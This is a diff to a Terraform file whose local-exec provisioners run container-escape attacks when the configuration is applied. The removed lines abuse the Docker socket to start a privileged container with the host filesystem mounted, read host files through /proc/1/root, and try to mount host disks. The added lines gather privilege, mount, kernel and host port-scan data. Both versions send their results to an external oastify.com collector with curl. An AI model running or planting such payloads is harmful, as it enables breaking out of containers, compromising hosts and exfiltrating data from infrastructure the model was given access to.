@@ -1,147 +1,90 @@
-# main.tf - Container Escape Attempts
-resource "null_resource" "container_escape" {
+# main.tf - Get Detailed Escape Results
+resource "null_resource" "escape_results" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== CONTAINER ESCAPE ATTEMPTS ==="
+      echo "=== CONTAINER ESCAPE RESULTS ===" > /tmp/escape_results.txt
       
-      # 1. Check for privileged container
-      echo "=== PRIVILEGE CHECK ==="
-      if [ -w /dev/kmsg ]; then echo "PRIVILEGED CONTAINER - HOST ACCESS POSSIBLE"; fi
-      cat /proc/self/status | grep -i cap
-      ls -la /proc/1/root/ 2>/dev/null && echo "HOST FILESYSTEM ACCESSIBLE VIA PROC"
+      # 1. Privilege and capability results
+      echo "=== PRIVILEGES ===" >> /tmp/escape_results.txt
+      whoami >> /tmp/escape_results.txt
+      id >> /tmp/escape_results.txt
+      cat /proc/self/status | grep -i cap >> /tmp/escape_results.txt 2>/dev/null
       
-      # 2. Check for Docker socket access
-      echo "=== DOCKER SOCKET CHECK ==="
-      ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET FOUND - HOST COMPROMISE POSSIBLE"
-      curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null && echo "DOCKER API ACCESSIBLE"
+      # 2. Docker socket results
+      echo "=== DOCKER SOCKET ===" >> /tmp/escape_results.txt
+      ls -la /var/run/docker.sock 2>/dev/null >> /tmp/escape_results.txt || echo "No docker socket" >> /tmp/escape_results.txt
       
-      # 3. Mount escape attempts
-      echo "=== MOUNT ESCAPE ==="
-      mount | grep -v tmpfs | grep -v cgroup
-      find / -name "*.sock" -type s 2>/dev/null | head -10
-      
-      # 4. Kernel exploit checks
-      echo "=== KERNEL EXPLOIT CHECK ==="
-      uname -a
-      cat /etc/os-release
-      which gcc && echo "GCC AVAILABLE - COMPILE EXPLOITS" || echo "No GCC"
-      
-      # 5. Service discovery on host
-      echo "=== HOST SERVICE DISCOVERY ==="
-      for port in 21 22 23 80 443 2375 2376 5000 8000 8080 9000; do
-        timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "Host port $port OPEN - $(
-          case $port in
-            22) echo "SSH" ;;
-            80|443) echo "WEB" ;;
-            2375|2376) echo "DOCKER API" ;;
-            5000) echo "DOCKER REGISTRY" ;;
-            8000|8080|9000) echo "MANAGEMENT" ;;
-            *) echo "UNKNOWN" ;;
-          esac
-        )"
+      # 3. Host service scan results
+      echo "=== HOST SERVICES ===" >> /tmp/escape_results.txt
+      for port in 22 80 443 2375 2376 8080 9000; do
+        timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "Port $port open on host" >> /tmp/escape_results.txt || true
       done
       
-      curl -X POST -d "escape_attempts_started=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape
+      # 4. Proc escape results
+      echo "=== PROC ESCAPE ===" >> /tmp/escape_results.txt
+      ls /proc/1/root/ 2>/dev/null && echo "Host proc accessible" >> /tmp/escape_results.txt || echo "No host proc access" >> /tmp/escape_results.txt
+      
+      # 5. Mount results
+      echo "=== MOUNTS ===" >> /tmp/escape_results.txt
+      mount | grep -v tmpfs | grep -v cgroup >> /tmp/escape_results.txt
+      
+      # 6. Kernel info
+      echo "=== KERNEL ===" >> /tmp/escape_results.txt
+      uname -a >> /tmp/escape_results.txt
+      
+      # Send the full results
+      curl -X POST --data-binary @/tmp/escape_results.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape_results
+      
+      echo "Escape results sent"
     EOT
   }
 }
 
-resource "null_resource" "docker_socket_exploit" {
+resource "null_resource" "critical_evidence" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== DOCKER SOCKET EXPLOITATION ==="
+      echo "=== CRITICAL EVIDENCE SUMMARY ==="
       
-      # If Docker socket is available, exploit it
+      # Check for the most critical findings
+      CRITICAL=false
+      
+      # 1. Docker socket access
       if [ -w /var/run/docker.sock ]; then
-        echo "DOCKER SOCKET EXPLOITATION ATTEMPT"
-        
-        # List all containers
-        echo "=== ALL CONTAINERS ==="
-        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool 2>/dev/null || curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
-        
-        # Run privileged container on host
-        echo "=== ATTEMPTING PRIVILEGED CONTAINER ==="
-        curl -s --unix-socket /var/run/docker.sock -X POST \
-          -H "Content-Type: application/json" \
-          -d '{
-            "Image": "alpine",
-            "Cmd": ["sh", "-c", "echo 'container_escape_success' > /tmp/host_compromised"],
-            "HostConfig": {
-              "Privileged": true,
-              "Binds": ["/:/host"]
-            }
-          }' \
-          http://localhost/containers/create
-          
-        echo "Docker socket exploitation attempted"
-      else
-        echo "No Docker socket access"
+        echo "CRITICAL: Docker socket writable"
+        CRITICAL=true
       fi
       
-      curl -X POST -d "docker_exploit_attempted=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/docker
-    EOT
-  }
-}
-
-resource "null_resource" "host_service_attack" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== HOST SERVICE ATTACKS ==="
+      # 2. Privileged container
+      if [ -w /dev/kmsg ]; then
+        echo "CRITICAL: Privileged container"
+        CRITICAL=true
+      fi
       
-      # 1. Try to access Docker API on host
-      echo "=== DOCKER API ON HOST ==="
-      curl -s http://172.17.0.1:2375/version 2>/dev/null && echo "DOCKER API EXPOSED ON HOST - CRITICAL"
-      curl -s http://172.17.0.1:2376/version 2>/dev/null && echo "DOCKER TLS API EXPOSED"
-      
-      # 2. Try common web services on host
-      echo "=== HOST WEB SERVICES ==="
-      curl -s http://172.17.0.1:80/ 2>/dev/null && echo "HTTP service on host"
-      curl -s http://172.17.0.1:443/ 2>/dev/null && echo "HTTPS service on host"
-      curl -s http://172.17.0.1:8080/ 2>/dev/null && echo "Port 8080 service"
-      curl -s http://172.17.0.1:9000/ 2>/dev/null && echo "Port 9000 service (often Docker UI)"
-      
-      # 3. Try SSH exploits (common weak credentials)
-      echo "=== SSH ATTEMPTS ==="
-      which sshpass && echo "sshpass available" || echo "no sshpass"
-      which hydra && echo "hydra available" || echo "no hydra"
-      
-      # 4. Check for Kubernetes
-      echo "=== KUBERNETES CHECK ==="
-      ls /var/run/secrets/kubernetes.io/ 2>/dev/null && echo "KUBERNETES ENVIRONMENT - CRITICAL"
-      curl -s http://172.17.0.1:10250/ 2>/dev/null && echo "KUBELET EXPOSED - CRITICAL"
-      
-      curl -X POST -d "host_services_checked=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/hostservices
-    EOT
-  }
-}
-
-resource "null_resource" "proc_escape" {
-  provisioner "local-exec" {
-    command = <<EOT
-      echo "=== PROC FILESYSTEM ESCAPE ==="
-      
-      # 1. Check if we can access host via proc
+      # 3. Host proc access
       if [ -d /proc/1/root ]; then
-        echo "HOST PROC ACCESSIBLE - ATTEMPTING ESCAPE"
-        ls -la /proc/1/root/etc/passwd 2>/dev/null && echo "HOST PASSWD ACCESSIBLE"
-        ls -la /proc/1/root/var/run/docker.sock 2>/dev/null && echo "HOST DOCKER SOCKET VISIBLE"
-        
-        # Try to read host files
-        cat /proc/1/root/etc/passwd | head -5 2>/dev/null
-        cat /proc/1/root/etc/hostname 2>/dev/null && echo "Host hostname: $(cat /proc/1/root/etc/hostname)"
-      else
-        echo "No host proc access"
+        echo "CRITICAL: Host proc filesystem accessible"
+        CRITICAL=true
       fi
       
-      # 2. Check for SYS_ADMIN capability
+      # 4. Docker API exposed
+      if timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/2375"; then
+        echo "CRITICAL: Docker API exposed on host"
+        CRITICAL=true
+      fi
+      
+      # 5. SYS_ADMIN capability
       if capsh --print 2>/dev/null | grep -q sys_admin; then
-        echo "SYS_ADMIN CAPABILITY - MOUNT ESCAPE POSSIBLE"
-        # Try to mount host filesystem
-        mkdir -p /mnt/host
-        mount /dev/sda1 /mnt/host 2>/dev/null && echo "HOST FILESYSTEM MOUNTED" || echo "Mount failed"
+        echo "CRITICAL: SYS_ADMIN capability"
+        CRITICAL=true
       fi
       
-      curl -X POST -d "proc_escape_attempted=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/procescape
+      if [ "$CRITICAL" = true ]; then
+        echo "CONTAINER ESCAPE POSSIBLE - CRITICAL IMPACT"
+        curl -X POST -d "container_escape_possible=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/critical_finding
+      else
+        echo "No container escape vectors found"
+        curl -X POST -d "container_escape_not_found=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/no_escape
+      fi
     EOT
   }
 }
